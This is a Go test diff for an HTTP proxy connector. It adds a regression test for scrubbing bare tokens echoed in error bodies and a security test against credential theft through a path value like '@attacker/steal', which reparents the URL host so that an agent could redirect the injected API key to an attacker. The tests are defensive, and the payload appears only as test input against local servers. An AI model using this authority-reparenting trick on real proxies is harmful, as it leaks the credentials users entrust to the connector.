@@ -472,6 +472,43 @@ func TestAuthValueScrubFilterReturnsFilterWhenEnabled(t *testing.T) {
 	}
 }
 
+// TestAuthValueScrubBareTokenWithAuthorizationHeader is the regression test for
+// M3: for an Authorization header a bare token is stored as "Bearer <token>",
+// but an upstream that echoes the RAW token (no scheme) in an error body must
+// still be scrubbed. The filter must carry patterns for BOTH the full value and
+// the bare credential.
+func TestAuthValueScrubBareTokenWithAuthorizationHeader(t *testing.T) {
+	const token = "sk-ant-rawsecret123"
+	upstream := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
+		w.WriteHeader(401)
+		// Upstream echoes the bare token, no "Bearer " scheme.
+		io.WriteString(w, `{"error":"invalid key `+token+`"}`)
+	}))
+	defer upstream.Close()
+
+	pc := makeProxy(t, upstream, "Authorization", token) // bare → stored "Bearer <token>"
+
+	f := pc.AuthValueScrubFilter()
+	if f == nil {
+		t.Fatal("scrub filter must be enabled")
+	}
+	if len(f.RedactPatterns) < 2 {
+		t.Fatalf("expected patterns for both the scheme-prefixed value and the bare token, got %v", f.RedactPatterns)
+	}
+
+	res, err := pc.Execute(context.Background(), "proxy_request", map[string]any{
+		"method": "GET",
+		"path":   "/v1/anything",
+	})
+	if err != nil {
+		t.Fatalf("Execute failed: %v", err)
+	}
+	body := res.(*ExecuteResult).Body
+	if strings.Contains(body, token) {
+		t.Errorf("bare token (echoed without a scheme) must be scrubbed; body=%q", body)
+	}
+}
+
 // --- auth_query_param injection ---
 
 // makeQueryAuthProxy builds a ProxyConnector configured for query-string auth
@@ -777,5 +814,46 @@ func TestAuthValueScrubStillFiresWithQueryAuth(t *testing.T) {
 	}
 	if !strings.Contains(body, "[REDACTED]") {
 		t.Errorf("expected [REDACTED] marker; got %q", body)
+	}
+}
+
+// TestExecuteNoCredentialExfilViaPathAuthority proves an agent-supplied path
+// cannot reparent the upstream authority to steal the credential. With the old
+// `targetURL + path` concat, path "@attacker/steal" produced
+// "http://target@attacker/steal" (Host=attacker) and the injected auth header
+// was sent there. httpguard allows both (loopback), so only the URL-parse +
+// host assertion in Execute stops the exfil.
+func TestExecuteNoCredentialExfilViaPathAuthority(t *testing.T) {
+	var attackerHit bool
+	attacker := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
+		attackerHit = true
+		t.Errorf("attacker origin MUST NOT be contacted (path=%s x-api-key=%q)", r.URL.Path, r.Header.Get("x-api-key"))
+	}))
+	defer attacker.Close()
+
+	var targetGotKey string
+	target := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
+		targetGotKey = r.Header.Get("x-api-key")
+		w.WriteHeader(http.StatusOK)
+	}))
+	defer target.Close()
+
+	pc := makeProxy(t, target, "x-api-key", "sk-secret")
+	attackerHost := strings.TrimPrefix(attacker.URL, "http://") // 127.0.0.1:PORT
+
+	// The classic authority-reparenting payload.
+	_, err := pc.Execute(context.Background(), "proxy_request", map[string]any{
+		"method": "GET",
+		"path":   "@" + attackerHost + "/steal",
+	})
+	_ = err // either a host-mismatch refusal or a benign request to the real target
+
+	if attackerHit {
+		t.Fatal("credential exfiltrated: attacker origin was contacted")
+	}
+	// If anything reached an upstream, it must have been the real target with the
+	// credential — never the attacker.
+	if targetGotKey != "" && targetGotKey != "sk-secret" {
+		t.Errorf("unexpected key at target: %q", targetGotKey)
 	}
 }
